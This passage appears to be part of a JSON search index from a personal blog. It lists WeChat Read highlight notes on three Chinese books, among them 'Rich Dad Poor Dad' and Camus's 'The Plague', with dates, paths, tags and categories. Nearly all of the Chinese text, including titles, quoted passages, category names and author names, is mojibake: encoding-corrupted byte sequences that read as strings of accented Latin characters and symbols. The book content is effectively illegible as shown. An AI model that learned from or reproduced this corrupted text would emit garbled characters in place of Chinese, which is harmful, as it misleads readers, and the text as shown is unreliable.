^3-2785-2825","tags":[{"name":"weread","slug":"weread","permalink":"https://hodlyounger.github.io/tags/weread/"},{"name":"å¾®ä¿¡è¯»ä¹¦","slug":"å¾®ä¿¡è¯»ä¹¦","permalink":"https://hodlyounger.github.io/tags/%E5%BE%AE%E4%BF%A1%E8%AF%BB%E4%B9%A6/"}],"categories":[{"name":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/"},{"name":"weread","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/"},{"name":"æœªåˆ†ç±»","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/æœªåˆ†ç±»","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/%E6%9C%AA%E5%88%86%E7%B1%BB/"}]},{"title":"å¯Œçˆ¸çˆ¸ç©·çˆ¸çˆ¸ (å…¨çƒæœ€ä½³è´¢å•†æ•™è‚²ç³»åˆ—)","date":"2024-08-31T01:35:29.332Z","path":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/æœªåˆ†ç±»/å¯Œçˆ¸çˆ¸ç©·çˆ¸çˆ¸ (å…¨çƒæœ€ä½³è´¢å•†æ•™è‚²ç³»åˆ—)-ã€”ç¾ã€•ç½—ä¼¯ç‰¹Â·æ¸…å´ï¼›ã€”ç¾ã€•èä¼¦Â·è±å¸Œç‰¹/","text":"ä½œè€…ï¼šã€”ç¾ã€•ç½—ä¼¯ç‰¹Â·æ¸…å´ï¼›ã€”ç¾ã€•èä¼¦Â·è±å¸Œç‰¹ - å†…å®¹ç®€ä»‹ ã€Šå¯Œçˆ¸çˆ¸ç©·çˆ¸çˆ¸ (å…¨çƒæœ€ä½³è´¢å•†æ•™è‚²ç³»åˆ—)ã€‹ å¯Œçˆ¸çˆ¸ç©·çˆ¸çˆ¸ (å…¨çƒæœ€ä½³è´¢å•†æ•™è‚²ç³»åˆ—) + ã€Šå¯Œçˆ¸çˆ¸ç©·çˆ¸çˆ¸ (å…¨çƒæœ€ä½³è´¢å•†æ•™è‚²ç³»åˆ—)ã€‹ å±æ€§ å†…å®¹ ISBN null ä½œè€… ã€”ç¾ã€•ç½—ä¼¯ç‰¹Â·æ¸…å´ï¼›ã€”ç¾ã€•èä¼¦Â·è±å¸Œç‰¹ å‡ºç‰ˆå¹´ å‡ºç‰ˆç¤¾ å››å·æ–‡è‰ºå‡ºç‰ˆç¤¾ æ¥æº å¯Œçˆ¸çˆ¸ç©·çˆ¸çˆ¸ (å…¨çƒæœ€ä½³è´¢å•†æ•™è‚²ç³»åˆ—) åˆ†ç±» é«˜äº®åˆ’çº¿ ç¬¬6ç«  ç¬¬äº”è¯¾ å¯Œäººçš„æŠ•èµ„ ç¬¬6ç«  ç¬¬äº”è¯¾ å¯Œäººçš„æŠ•èµ„ å…¶å®ï¼Œå¤§éƒ¨åˆ†äººä¸€ç”Ÿå½“ä¸­è‡³å°‘ä¼šé‡åˆ°ä¸€æ¬¡å¤§å¥½çš„æœºä¼šï¼Œåªæ˜¯ä»–ä»¬è‡ªå·±æ²¡æœ‰çœ‹è§è€Œå·²ã€‚ä¸€å¹´ä¹‹åï¼Œå½“ä»–ä»¬çŒ›ç„¶æ„è¯†åˆ°é‚£ä¸ªæœºä¼šçš„ä»·å€¼æ—¶ï¼Œåˆ«äººæ—©å°±å› æ­¤è‡´å¯Œäº†ã€‚ â€” åˆ›å»ºäº [[2024-08-27]] 01:37 ^11-5733-5802 ç¬¬6ç«  ç¬¬äº”è¯¾ å¯Œäººçš„æŠ•èµ„ æ‹¥æœ‰ç†è´¢èƒ½åŠ›å°±æ„å‘³ç€æ‹¥æœ‰æ›´å¤šçš„é€‰æ‹©æœºä¼šã€‚ â€” åˆ›å»ºäº [[2024-08-27]] 01:33 ^11-5828-5848 ç¬¬6ç«  ç¬¬äº”è¯¾ å¯Œäººçš„æŠ•èµ„ å¯å¤§éƒ¨åˆ†äººå´åªçŸ¥é“ä¸€ç§æ–¹æ³•ï¼šåŠªåŠ›å·¥ä½œã€å‚¨è“„å’Œå€Ÿè´·ã€‚ â€” åˆ›å»ºäº [[2024-08-27]] 01:32 ^11-6059-6084 ç¬¬6ç«  ç¬¬äº”è¯¾ å¯Œäººçš„æŠ•èµ„ å¾ˆå°‘æœ‰äººçŸ¥é“æœºé‡å’Œé‡‘é’±æ˜¯å¯ä»¥åˆ›é€ çš„ã€‚å¦‚æœä½ æƒ³æ›´å¹¸è¿ä¸€äº›ï¼ŒæŒ£åˆ°æ›´å¤šçš„é’±ï¼Œè€Œä¸åªæ˜¯è¾›è‹¦å·¥ä½œï¼Œé‚£ä¹ˆä½ çš„ç†è´¢èƒ½åŠ›å°±éå¸¸å…³é”®ã€‚ â€” åˆ›å»ºäº [[2024-08-27]] 01:32 ^11-6173-6231 ç¬¬6ç«  ç¬¬äº”è¯¾ å¯Œäººçš„æŠ•èµ„ æ¯æœˆæ‹¿å‡ºä¸€ç¬”é’±å­˜èµ·æ¥å¬ä¸Šå»ç¡®å®æ˜¯ä¸€ä¸ªå¥½ä¸»æ„ã€‚è¿™æ˜¯ä¸€ç§é€‰æ‹©ï¼Œä¸€ç§å¤§å¤šæ•°äººéƒ½æ„¿æ„é‡‡å–çš„é€‰æ‹©ã€‚é—®é¢˜å°±æ˜¯ï¼šå®ƒä¼šè’™è”½äººä»¬çš„åŒçœ¼ï¼Œä½¿äººä»¬çœ‹ä¸åˆ°äº‹æƒ…çš„çœŸç›¸ï¼Œä»è€Œé”™è¿‡å¾ˆå¤šä½¿èµ„é‡‘å¤§é‡å¢åŠ çš„æœºä¼šã€‚äºæ˜¯ï¼Œæœºä¼šå°±æ­¤ä¸ä»–ä»¬å¤±ä¹‹äº¤è‡‚äº†ã€‚ â€” åˆ›å»ºäº [[2024-08-27]] 01:31 ^11-7461-7565 ç¬¬6ç«  ç¬¬äº”è¯¾ å¯Œäººçš„æŠ•èµ„ æˆ‘ä¹‹æ‰€ä»¥æƒ³ä¸æ–­åœ°æé«˜è‡ªå·±çš„è´¢å•†ï¼Œæ˜¯å› ä¸ºæ¯å½“å¸‚åœºå‘ç”Ÿå˜åŒ–æ—¶ï¼Œä¸€äº›äººä¼šå»ä¹æ±‚ä¿ä½ä¸€ä»½å·¥ä½œï¼Œè€Œå¦ä¸€äº›äººä¼šæ¥åˆ°ç”Ÿæ´»æŠ›ç»™ä»–ä»¬çš„é…¸æŸ æª¬â€”â€”æˆ‘ä»¬æ¯ä¸ªäººå¶å°”éƒ½ä¼šæœ‰è¿™æ ·çš„åè¿æ°”â€”â€”ç„¶åå°†å…¶å˜æˆæ•°ä»¥ç™¾ä¸‡è®¡çš„ç¾å…ƒã€‚è¿™å°±æ˜¯è´¢å•†ã€‚ â€” åˆ›å»ºäº [[2024-08-27]] 01:37 ^11-12308-12410 ç¬¬6ç«  ç¬¬äº”è¯¾ å¯Œäººçš„æŠ•èµ„ çœŸæ­£ç‚™æ‰‹å¯çƒ­çš„äº¤æ˜“ä¸ä¼šç•™ç»™æ–°æ‰‹ã€‚ â€” åˆ›å»ºäº [[2024-08-27]] 09:15 ^11-14897-14913 ç¬¬6ç«  ç¬¬äº”è¯¾ å¯Œäººçš„æŠ•èµ„ ä¸€èˆ¬æ¥è¯´ï¼Œèƒ½ä½¿å¯Œè€…æ›´å¯Œçš„æœ€å¥½çš„äº¤æ˜“æ€»æ˜¯ä¸ºé‚£äº›ç²¾é€šæ¸¸æˆè§„åˆ™çš„äººå‡†å¤‡çš„ã€‚ä¸€ä¸ªè¢«è®¤ä¸ºæ˜¯ä¸å¤Ÿâ€œè€ç»ƒâ€çš„äººè¿›è¡Œè¿™æ ·çš„äº¤æ˜“åœ¨æŠ€æœ¯ä¸Šæ˜¯ä¸å¯èƒ½çš„ï¼Œå½“ç„¶è¿™ç§äº‹æƒ…ä¹Ÿæœ‰è¿‡ã€‚ â€” åˆ›å»ºäº [[2024-08-27]] 09:15 ^11-14913-14988 ç¬¬7ç«  ç¬¬å…­è¯¾ å­¦ä¼šä¸ä¸ºé’±å·¥ä½œ ç¬¬7ç«  ç¬¬å…­è¯¾ å­¦ä¼šä¸ä¸ºé’±å·¥ä½œ å½“æ¶‰åŠé’±çš„æ—¶å€™ï¼Œåªæœ‰ä¸€é¡¹æŠ€èƒ½çš„äººä¸å¾—ä¸åŠªåŠ›å·¥ä½œã€‚ â€” åˆ›å»ºäº [[2024-08-27]] 19:11 ^12-2692-2716 ç¬¬9ç«  å¼€å§‹è¡ŒåŠ¨ ç¬¬9ç«  å¼€å§‹è¡ŒåŠ¨ 1ï¼æˆ‘éœ€è¦ä¸€ä¸ªè¶…ç°å®çš„ç†ç”±â€”â€”ç²¾ç¥çš„åŠ›é‡ã€‚ â€” åˆ›å»ºäº [[2024-08-28]] 08:32 ^16-1717-1738 ç¬¬9ç«  å¼€å§‹è¡ŒåŠ¨ 2ï¼æ¯å¤©ä½œå‡ºè‡ªå·±çš„é€‰æ‹©â€”â€”é€‰æ‹©çš„åŠ›é‡ã€‚ â€” åˆ›å»ºäº [[2024-08-28]] 08:32 ^16-2795-2814 ç¬¬9ç«  å¼€å§‹è¡ŒåŠ¨ é¦–å…ˆæŠ•èµ„äºæ•™è‚²ã€‚å®é™…ä¸Šï¼Œä½ æ‰€æ‹¥æœ‰çš„å”¯ä¸€çœŸæ­£çš„èµ„äº§å°±æ˜¯ä½ çš„å¤´è„‘ï¼Œè¿™æ˜¯æˆ‘ä»¬èƒ½æ§åˆ¶çš„æœ€å¼ºæœ‰åŠ›çš„å·¥å…·ã€‚å°±åƒæˆ‘åˆšæ‰è¯´çš„äººä»¬éƒ½æœ‰é€‰æ‹©çš„åŠ›é‡ï¼Œå½“æˆ‘ä»¬é€æ¸é•¿å¤§æ—¶ï¼Œæ¯ä¸ªäººéƒ½è¦é€‰æ‹©è¦å­¦ä¹ ä»€ä¹ˆæ ·çš„çŸ¥è¯†ã€‚ â€” åˆ›å»ºäº [[2024-08-28]] 08:26 ^16-3500-3590 ç¬¬9ç«  å¼€å§‹è¡ŒåŠ¨ å½“æŸç§æ–°æ€æƒ³ä¸æ—§æœ‰çš„æ€ç»´æ–¹å¼å‘ç”Ÿå†²çªæ—¶ï¼Œè®¸å¤šæ‰€è°“çš„èªæ˜äººä¼šæœ¬èƒ½åœ°ä¸ºè‡ªå·±è¾©æŠ¤ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä»–ä»¬çš„â€œèªæ˜â€å’Œâ€œå‚²æ…¢â€ç»“åˆåœ¨ä¸€èµ·å°±ç­‰äºâ€œæ— çŸ¥â€ã€‚ â€” åˆ›å»ºäº [[2024-08-28]] 08:29 ^16-4584-4654 ç¬¬9ç«  å¼€å§‹è¡ŒåŠ¨ ä¸€ä¸ªçœŸæ­£èªæ˜çš„äººæ€»æ˜¯æ¬¢è¿æ–°æ€æƒ³ï¼Œå› ä¸ºæ–°æ€æƒ³èƒ½ä½¿ä»–çš„æ€æƒ³åº“æ›´åŠ ä¸°å¯Œã€‚å¬æ¯”è¯´æ›´é‡è¦ï¼Œå¦åˆ™ï¼Œä¸Šå¸å°±ä¸ä¼šç»™æˆ‘ä»¬ä¸¤åªè€³æœµä¸€å¼ å˜´å·´äº†ã€‚ â€” åˆ›å»ºäº [[2024-08-28]] 08:30 ^16-4696-4757 ç¬¬9ç«  å¼€å§‹è¡ŒåŠ¨ æœ‰çš„äººæŠ•èµ„è‚¡ç¥¨æˆ–æˆ¿åœ°äº§ï¼Œå´ä»ä¸æŠ•èµ„äºä»–ä»¬æœ€é‡è¦çš„èµ„äº§â€”â€”å¤´è„‘ï¼Œå¯¹æ­¤æˆ‘å¸¸å¸¸æ„Ÿåˆ°éœ‡æƒŠã€‚ â€” åˆ›å»ºäº [[2024-08-28]] 08:32 ^16-4908-4949 ç¬¬9ç«  å¼€å§‹è¡ŒåŠ¨ 3ï¼æ…é‡åœ°é€‰æ‹©æœ‹å‹â€”â€”å…³ç³»çš„åŠ›é‡ã€‚ â€” åˆ›å»ºäº [[2024-08-28]] 08:46 ^16-5020-5037","tags":[{"name":"weread","slug":"weread","permalink":"https://hodlyounger.github.io/tags/weread/"},{"name":"å¾®ä¿¡è¯»ä¹¦","slug":"å¾®ä¿¡è¯»ä¹¦","permalink":"https://hodlyounger.github.io/tags/%E5%BE%AE%E4%BF%A1%E8%AF%BB%E4%B9%A6/"}],"categories":[{"name":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/"},{"name":"weread","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/"},{"name":"æœªåˆ†ç±»","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/æœªåˆ†ç±»","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/%E6%9C%AA%E5%88%86%E7%B1%BB/"}]},{"title":"é¼ ç–«","date":"2024-08-31T01:35:29.331Z","path":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/æ–‡å­¦/é¼ ç–«-ã€æ³•ã€‘åŠ ç¼ª/","text":"ä½œè€…ï¼šã€æ³•ã€‘åŠ ç¼ª - å†…å®¹ç®€ä»‹ ã€Šé¼ ç–«ã€‹ ã€Šé¼ ç–«ã€‹æ˜¯åŠ ç¼ªçš„ä¸­ç¯‡å°è¯´é›†ï¼ŒåŒ…æ‹¬ã€Šå±€å¤–äººã€‹ã€Šé¼ ç–«ã€‹ã€Šå •è½ã€‹ä¸‰éƒ¨ä½œå“ã€‚ã€Šé¼ ç–«ã€‹ä¸ã€Šå±€å¤–äººã€‹æ˜¯åŠ ç¼ªæœ€é‡è¦çš„ä»£è¡¨ä½œï¼Œå‡è¢«åˆ—ä¸ºç°ä»£ä¸–ç•Œæ–‡å­¦åè‘—ã€‚ã€Šå±€å¤–äººã€‹å†™çš„æ˜¯äººåœ¨è’ç¼ªçš„ä¸–ç•Œä¸­å­¤ç«‹æ— æ´ï¼Œèº«ä¸ç”±å·²ï¼›ã€Šé¼ ç–«ã€‹å†™çš„æ˜¯é¢ä¸´åŒæ ·è’å”çš„ç”Ÿå­˜ç¯å¢ƒæ—¶ï¼Œæœ‰ç€æˆªç„¶ä¸åŒçš„æ€åº¦ï¼Œåœ¨è‰°è‹¦ææ–—ä¸­æ„Ÿå—ç€äººç”Ÿå¹¸ç¦çš„æ•…äº‹ã€‚ é¼ ç–« + ã€Šé¼ ç–«ã€‹ å±æ€§ å†…å®¹ ISBN 9787544763851 ä½œè€… ã€æ³•ã€‘åŠ ç¼ª å‡ºç‰ˆå¹´ 2017-01-01 å‡ºç‰ˆç¤¾ è¯‘æ—å‡ºç‰ˆç¤¾ æ¥æº é¼ ç–« åˆ†ç±» æ–‡å­¦-å¤–å›½æ–‡å­¦ é«˜äº®åˆ’çº¿ æ€»åº æ€»åº ä»–çš„å®¶åº­ç”Ÿè®¡è‰°éš¾ï¼Œå¹¸äºåŠ ç¼ªå…„å¼ŸäºŒäººè¢«æ‰¿è®¤ä¸ºæˆ˜äº‰é˜µäº¡è€…çš„å­¤å„¿ï¼Œæ¯å¹´ä»æ”¿åºœå¾—åˆ°è‹¥å¹²æŠšæ¤é‡‘ï¼Œå¾—ä»¥ç»´æŒæœ€ä½æ°´å¹³çš„ç”Ÿæ´»ä¸ä¸Šå°å­¦å¿µä¹¦ï¼Œä½†æ˜¯â€œæ¯æ¬¡å›åˆ°å®¶ä¸­ï¼Œå°±å›åˆ°äº†è´«ç©·ã€è‚®è„ã€ä»¤äººåŒæ¶çš„åœ°æ–¹â€ï¼Œå®¶é‡Œè¿åšä½œä¸šçš„æ¡Œå­ä¹Ÿæ²¡æœ‰ã€‚â€œäººäººéƒ½å¾—å¹²æ´»æŒ£é’±â€ï¼ŒåŠ ç¼ªå…„å¼Ÿä¹Ÿä¸èƒ½ä¾‹å¤–ï¼Œåªæ˜¯ç”±äºæ¯äº²çš„å¤§åŠ›æ”¯æŒä¸è‰°è‹¦æ”¯æ’‘ï¼ŒåŠ ç¼ªæ‰æœªè¾å­¦ä¸€ç›´å¿µå®Œäº†é«˜ä¸­ï¼Œæ¥ç€åˆåœ¨é˜¿å°”åŠå°”å¤§å­¦å®Œæˆäº†ä»–çš„å­¦ä¸šï¼Œå…ˆåäº1934å¹´ä¸1935å¹´ï¼Œè·å¾—äº†æ–‡å­¦ä¸å“²å­¦ä¸¤ä¸ªæ¯•ä¸šæ–‡å‡­ â€” åˆ›å»ºäº [[2022-04-09]] 09:39 ^1-2676-2878 æ€»åº äººäººèº«ä¸Šéƒ½æ½œä¼ç€é¼ ç–«ï¼Œå› ä¸ºï¼Œæ²¡æœ‰äººï¼Œæ˜¯çš„ï¼Œä¸–ç•Œä¸Šæ²¡æœ‰ä»»ä½•äººèƒ½å…å—å…¶å®³ â€” åˆ›å»ºäº [[2022-04-10]] 17:37 ^1-19926-19960 æ€»åº 17ä¸–çºªæ³•å›½å¤§å“²å­¦å®¶ç¬›å¡å„¿ï¼Œæ›¾æå‡ºä¸€ä¸ªä¸¾ä¸–é—»åçš„å‘½é¢˜â€œæˆ‘æ€æ•…æˆ‘åœ¨â€ï¼ŒæŠŠæ€æƒ³æé«˜åˆ°äººä¹‹æ‰€ä»¥æˆä¸ºäººã€äººä¹‹æ‰€ä»¥å­˜åœ¨çš„å”¯ä¸€æ ‡å¿—ã€å”¯ä¸€æ¡ä»¶ã€‚åŠ ç¼ªåœ¨ã€ŠåæŠ—è€…ã€‹ä¸­ï¼Œåˆ™æå‡ºè¿™æ ·ä¸€ä¸ªå‘½é¢˜â€œæˆ‘åæŠ—æ•…æˆ‘åœ¨â€ï¼ŒæŠŠåæŠ—è§†ä¸ºäººä¹‹æ‰€ä»¥æˆä¸ºäººã€äººä¹‹æ‰€ä»¥å­˜åœ¨çš„æ ‡å¿—ä¸æ¡ä»¶ã€‚ â€” åˆ›å»ºäº [[2022-04-10]] 19:02 ^1-22441-22560","tags":[{"name":"weread","slug":"weread","permalink":"https://hodlyounger.github.io/tags/weread/"},{"name":"å¾®ä¿¡è¯»ä¹¦","slug":"å¾®ä¿¡è¯»ä¹¦","permalink":"https://hodlyounger.github.io/tags/%E5%BE%AE%E4%BF%A1%E8%AF%BB%E4%B9%A6/"}],"categories":[{"name":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/"},{"name":"weread","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/"},{"name":"æ–‡å­¦","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/æ–‡å­¦","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/%E6%96%87%E5%AD%A6/"}]},{"title":"é’æ˜¥æ˜¯ä¸€æœ¬ä»“ä¿ƒçš„ä¹¦ï¼Œæˆ‘ä»¬æµç€æ³ªä¸€è¯»å†è¯»","date":"2024-08-31T01:35:29.327Z","path":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/æ–‡å­¦/é’æ˜¥æ˜¯ä¸€æœ¬ä»“ä¿ƒçš„ä¹¦ï¼Œæˆ‘ä»¬æµç€æ³ªä¸€è¯»å†è¯»-å‚…é¦–å°”/","text":"ä½œè€…ï¼šå‚…é¦–å°” - å†…å®¹ç®€ä»‹ ã€Šé’æ˜¥æ˜¯ä¸€æœ¬ä»“ä¿ƒçš„ä¹¦ï¼Œæˆ‘ä»¬æµç€æ³ªä¸€è¯»å†è¯»ã€‹ æ¯ä¸ªç«¥å¨Ÿçš„èº«è¾¹éƒ½æ›¾æœ‰è¿‡ä¸€ä¸ªç«¥é¢œã€‚ç«¥å¨Ÿå¤©çœŸå¿ åšï¼ŒæŒ‰éƒ¨å°±ç­åœ°æˆé•¿ï¼›ç«¥é¢œç‰¹ç«‹ç‹¬è¡Œï¼Œå¯¹ç‰©è´¨æåº¦æ¸´æœ›ã€‚ä½†åŒæ—¶ï¼Œç«¥å¨Ÿä¹Ÿåœ¨å‘å¾€æœªçŸ¥çš„è¿œæ–¹ï¼Œç«¥é¢œä¹Ÿä¼šé™·å…¥æ„Ÿæƒ…çš„è¿·æƒ˜ã€‚å¥¹ä»¬è‡ªå¹¼ç›¸ä¼´æˆé•¿ï¼Œæ˜æ˜æ˜¯ä¸¤ä¸ªå®Œå…¨ä¸åŒçš„äººï¼Œå´åˆåƒä¸€é¢é•œå­ï¼Œæ˜ å‡ºå½¼æ­¤çš„å¦ä¸€å‰¯æ¨¡æ ·ã€‚é’æ˜¥æ˜¯ä¸€æœ¬ä»“ä¿ƒçš„ä¹¦ï¼Œç«¥å¨Ÿå’Œç«¥é¢œåœ¨ç»å†è¿‡ç°å®çš„æ¼©æ¶¡åç»ˆç©¶èµ°å‘æ®Šé€”ã€‚ç«¥é¢œæ”¾å¼ƒäº†æ·±çˆ±å¥¹çš„ç”·å‹ï¼Œåˆ†æ‰‹åæ²¦ä¸ºä»–äººæƒ…å¦‡ï¼Œåœ¨è¿™æ®µè¢«äººå”¾å¼ƒçš„å…³ç³»ä¸­é¥±å—ç¾è¾±ä¸ç£¨éš¾ï¼Œå¤±è¶³æˆæ¨ã€‚è€Œç«¥å¨Ÿå´å›å½’å°åŸï¼Œç›¸å¤«æ•™å­ï¼Œè¿‡ä¸Šäº†å®‰ç¨³å¹³é™çš„ç”Ÿæ´»â€¦â€¦å›å¿†é‡Œçš„äººå’Œäº‹æ—©å·²é¢ç›®å…¨éï¼Œæˆ‘ä»¬ä¸åœé©»è¶³ï¼Œä¸ä½å›æœ›ã€‚çœ‹å›ä¸å»çš„æ¥æ—¶è·¯ï¼Œè‹èŒ«ã€è™šå¦„ã€‚ é’æ˜¥æ˜¯ä¸€æœ¬ä»“ä¿ƒçš„ä¹¦ï¼Œæˆ‘ä»¬æµç€æ³ªä¸€è¯»å†è¯» + ã€Šé’æ˜¥æ˜¯ä¸€æœ¬ä»“ä¿ƒçš„ä¹¦ï¼Œæˆ‘ä»¬æµç€æ³ªä¸€è¯»å†è¯»ã€‹ å±æ€§ å†…å®¹ ISBN 9787511370792 ä½œè€… å‚…é¦–å°” å‡ºç‰ˆå¹´ 2018-03-01 å‡ºç‰ˆç¤¾ ä¸­å›½åä¾¨å‡ºç‰ˆç¤¾ æ¥æº é’æ˜¥æ˜¯ä¸€æœ¬ä»“ä¿ƒçš„ä¹¦ï¼Œæˆ‘ä»¬æµç€æ³ªä¸€è¯»å†è¯» åˆ†ç±» æ–‡å­¦-ç»å…¸ä½œå“ é«˜äº®åˆ’çº¿ Chapter 03 ç‹—å±è¿&amp;æ¡ƒèŠ±è¿ Chapter 03 ç‹—å±è¿&amp;æ¡ƒèŠ±è¿ æœ‰ä¸€ç§äººï¼Œä¹ æƒ¯æŠŠè‡ªå·±å±‚å±‚åŒ…è£¹èµ·æ¥ï¼Œå…ˆå»æ„Ÿå—åˆ°å¯¹æ–¹å¿ƒçš„æ¸©åº¦ï¼Œæ‰æ…¢æ…¢é‡Šæ”¾è‡ªå·±ä½“å†…çš„çƒ­åº¦ã€‚ â€” åˆ›å»ºäº [[2022-08-15]] 22:10 ^29-715-757 Chapter 03 ç‹—å±è¿&amp;æ¡ƒèŠ±è¿ é‚£æ®µæ—¶é—´ï¼Œæˆ‘ä¸Šç­ç´¯å¾—åƒç‹—ï¼Œä¸‹ç­æ¯”ç‹—è¿˜ç´¯ã€‚ â€” åˆ›å»ºäº [[2022-08-15]] 22:09 ^29-3955-3975 Chapter 03 ç‹—å±è¿&amp;æ¡ƒèŠ±è¿ ä½ ä»¬ä»¥ä¸ºæˆ‘å‘æ˜¥å‘éªšæ‰€ä»¥æƒ³ç‹æµ·å—ï¼Ÿé”™ï¼ â€” åˆ›å»ºäº [[2022-08-15]] 22:08 ^29-4064-4111 Chapter 03 ç‹—å±è¿&amp;æ¡ƒèŠ±è¿ äººåœ¨å¹´è½»çš„æ—¶å€™æ€»ä¼šå—åˆ°è¿™æ ·æˆ–é‚£æ ·çš„ä¼¤å®³ï¼Œä½†å¾ˆå°‘æœ‰äººèƒ½é¢„è§è¿™ç§ä¼¤å®³ï¼Œä¹Ÿå¾ˆå°‘æœ‰äººå› ä¸ºæƒ§æ€•ä¼¤å®³è€Œä¸å»çˆ±ã€‚ â€” åˆ›å»ºäº [[2022-08-15]] 21:36 ^29-18506-18555 Chapter 03 ç‹—å±è¿&amp;æ¡ƒèŠ±è¿ æ²¡äººåœ¨ä¹åˆ°åº•å»å“ªé‡Œï¼Œæ— éæ˜¯æƒ³æ•´å¤©åœ¨ä¸€èµ·ã€‚ â€” åˆ›å»ºäº [[2022-08-15]] 21:37 ^29-18849-18869 Chapter 05 æ—§æ‹æƒ…&amp;æ–°æœºé‡ Chapter 05 æ—§æ‹æƒ…&amp;æ–°æœºé‡ æœ‰æ—¶ï¼Œæˆ‘è§‰å¾—åœ¨ä¸–ä¸ºäººçœŸæ˜¯ä¸€ä»¶ç¾å¦™çš„äº‹ï¼Œè€å¤©æ€»ä¼šç»™ä½ ä¸€äº›æš—ç¤ºï¼Œè®©ä½ æ‰¾åˆ°ä¸€æ¡è·¯é€šå¾€è‡ªå·±çš„å†…å¿ƒã€‚ â€” åˆ›å»ºäº [[2022-08-15]] 23:18 ^31-950-995 Chapter 05 æ—§æ‹æƒ…&amp;æ–°æœºé‡ æˆ‘ä»å¿ƒåº•ç¾¡æ…•åƒæ»¡æ»¡è¿™æ ·å®¶åº­æ¡ä»¶ä¼˜è¶Šçš„å¹´è½»äººï¼Œä»–ä»¬çš„ä¹å¤©å‘è‡ªè‚ºè…‘ï¼Œé‚£ç§èº«æ— å‹åŠ›è½»æ¾è‡ªç”±çš„çŠ¶æ€ä¸€èˆ¬äººæ ¹æœ¬æ¨¡ä»¿ä¸æ¥ã€‚ä»–ä»¬å¯ä»¥è®¤çœŸåœ°å¹²ç‚¹å„¿ä»€ä¹ˆï¼Œä¹Ÿå¯ä»¥ä»€ä¹ˆéƒ½ä¸å¹²ï¼Œä»–ä»¬å¯ä»¥å¤§èƒ†åœ°è¿½æ±‚ç†æƒ³ï¼Œä¹Ÿå¯ä»¥æ²¡æœ‰ç†æƒ³ã€‚ â€” åˆ›å»ºäº [[2022-08-15]] 23:35 ^31-15033-15130 Chapter 11 æ—§äºº&amp;æ–°è½¦ Chapter 11 æ—§äºº&amp;æ–°è½¦ ä¸€é¡¿é¥­çœŸä¸åœ¨æ„åƒä»€ä¹ˆï¼Œå…³é”®çœ‹ä½ è·Ÿè°åƒã€‚ â€” åˆ›å»ºäº [[2022-08-16]] 00:57 ^37-4634-4653 Chapter 11 æ—§äºº&amp;æ–°è½¦ æˆ‘æ‹’ç»ï¼Œåªå› æˆ‘ç°åœ¨æ¯”ä»¥å‰æ›´æ‡‚â€”â€”æ‰“è‚¿è„¸å……èƒ–å­çš„äº‹æ˜¯å¹²ä¸é•¿çš„ã€‚åœ¨åŒ—äº¬ï¼Œå¯Œè£•ç”Ÿæ´»è¦ç»å¯¹ç»å¾—èµ·è€ƒéªŒã€‚æ™®é€šäººè§£å†³å®Œä¹°è½¦çš„é—®é¢˜ï¼Œåˆå¾—è§£å†³å…»è½¦çš„é—®é¢˜ï¼Œå¯¹è¿æå‡ æ¬¡æ´—è½¦é’±éƒ½è¦å‰²è‚‰èˆ¬å¿ƒç–¼çš„æˆ‘æ¥è¯´ï¼Œå¼€è½¦å®Œå…¨æ˜¯ç»™è‡ªå·±æ‰¾å‹åŠ›â€¦â€¦ â€” åˆ›å»ºäº [[2022-08-16]] 01:09 ^37-17606-17708 Chapter 12 é€å­ä¸­åŒ»&amp;ä¹¡äº²ä¿å§† Chapter 12 é€å­ä¸­åŒ»&amp;ä¹¡äº²ä¿å§† æˆ‘å¤ªè¿‡æƒ…ç»ªåŒ–ã€‚å¦‚æœæˆ‘æƒ³å¹²å¥½ä¸€ä»¶äº‹ï¼Œé‚£æˆ‘èƒ½å¹²å¾—å‡ºä¹æ„æ–™åœ°å¥½ï¼Œä½†ä¸€æ—¦äº§ç”Ÿè´Ÿé¢æƒ…ç»ªï¼ŒåˆåŠ¿å¿…é”™æ¼ç™¾å‡ºã€‚ â€” åˆ›å»ºäº [[2022-08-16]] 01:10 ^38-1139-1215 Chapter 12 é€å­ä¸­åŒ»&amp;ä¹¡äº²ä¿å§† 